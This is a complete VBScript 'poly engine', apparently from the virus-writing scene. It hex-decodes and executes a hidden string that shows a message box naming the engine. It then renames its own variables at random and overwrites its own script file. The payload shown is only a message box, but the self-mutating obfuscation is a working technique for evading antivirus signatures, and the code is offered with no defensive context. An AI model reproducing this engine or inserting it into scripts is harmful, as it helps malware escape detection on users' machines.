mark = "6D7367626F782022546869732069732050737963686F6C6F676963205363"
mark = mark & "7269707420506F6C7920456E67696E65220D0A"
Set fso=createobject("scripting.filesystemobject"):Randomize
For counter=1 To Len(mark) Step 2:NewCode = NewCode & Chr("&h"& Mid(mark,counter,2))
next:execute(NewCode):Randomize:for secounter=1 to int(rnd*27)+int(rnd*19)+1:fvar0=Chr(Int(22*Rnd)+97)
fvar1=Chr(Int(22*Rnd)+97):fvar2=Chr(Int(22*Rnd)+97):fvar3=Chr(Int(22*Rnd)+97)
fvar4=Chr(Int(22*Rnd)+97):fvar5=Chr(Int(22*Rnd)+97):fvar6=Chr(Int(22*Rnd)+97)
fvar7=Chr(Int(22*Rnd)+97):fvar8=Chr(Int(22*Rnd)+97):fvar9=Chr(Int(22*Rnd)+97)
varall0=fvar0&varall0:varall1=fvar1&varall1:varall2=fvar2&varall2:varall3=fvar3&varall3
varall4=fvar4&varall4:varall5=fvar5&varall5:varall6=fvar6&varall6:varall7=fvar7&varall7
varall8=fvar8&varall8:varall9=fvar9&varall9:Next:set lookback=fso.opentextfile(wscript.scriptfullname,1,false)
poly=lookback.readall:poly=replace(poly,"fso",varall1):poly=replace(poly,"mark",varall2)
poly=replace(poly,"NewCode",varall3):poly=replace(poly,"lookback",varall4):poly=replace(poly,"poly",varall5)
poly=replace(poly,"counter",varall6):poly=replace(poly,"writeback",varall7):poly=replace(poly,"fvar",varall8)
poly=replace(poly,"varall",varall9):poly=replace(poly,"secounter",varall0)
set writeback=fso.opentextfile(wscript.scriptfullname,2,false):writeback.write poly:writeback.close